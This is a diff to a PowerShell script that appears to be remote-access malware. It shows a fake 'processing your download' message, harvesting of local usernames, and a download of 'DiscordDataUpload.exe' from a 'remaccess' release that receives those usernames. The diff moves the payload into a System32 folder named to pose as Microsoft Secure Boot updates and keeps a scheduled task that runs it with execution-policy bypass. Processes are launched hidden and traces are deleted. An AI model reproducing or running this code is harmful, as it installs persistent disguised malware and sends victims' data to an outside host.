@@ -1,11 +1,11 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Write-Host "Processing Your Downloaded File, Please Don't Close this window" -ForegroundColor Yellow -BackgroundColor Black
-$regPath = "HKLM:\Software\WindowsUpdateService"
+$regPath = "HKLM:\SOFTWARE\Microsoft\WindowsUpdateService"
 $userNamesRaw = Get-WmiObject -Class Win32_UserProfile | ForEach-Object { $_.LocalPath.Split('\')[-1] }
 $userNamesClean = $userNamesRaw -join ' | '
 $userNames = '"' + $userNamesClean + '"'
-$exepath =  "C:/Windows/System32/DiscordDataUpload.exe"
-$shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
+$exepath =  "C:/Windows/System32/SecureBootUpdatesMicrosoft/DiscordDataUpload.exe"
+$shellscriptpath = "C:/Windows/System32/SecureBootUpdatesMicrosoft/WindowsUpdateService.ps1"
 $messageboturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
 if (-not (Test-Path $regPath)) {
     New-Item -Path $regPath -Force
@@ -102,8 +102,8 @@ $updateservxml = @"
   <Actions Context="Author">
     <Exec>
       <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
-      <Arguments>-ExecutionPolicy Bypass -File "C:\Windows\System32\WindowsUpdateService.ps1"</Arguments>
-      <WorkingDirectory>C:\Windows\System32</WorkingDirectory>
+      <Arguments>-ExecutionPolicy Bypass -File "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateService.ps1"</Arguments>
+      <WorkingDirectory>"C:\Windows\System32\SecureBootUpdatesMicrosoft\</WorkingDirectory>
     </Exec>
   </Actions>
 </Task>
@@ -122,8 +122,9 @@ Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $code
 Start-Sleep 2
 Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $userNames
 Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
+
 # Removal of directories
-$ps1Files = @("C:\Windows\WindowsUpdateService.ps1", "C:\Windows\WindowsUpdateServiceDaemon.ps1")
+$ps1Files = @("C:\Windows\WindowsUpdateService.ps1", "C:\Windows\WindowsUpdateServiceDaemon.ps1", "C:\Windows\System32\WindowsUpdateService.ps1")
 foreach ($file in $ps1Files) {
     if (Test-Path $file -PathType Leaf) {
         Remove-Item -Path $file -Force
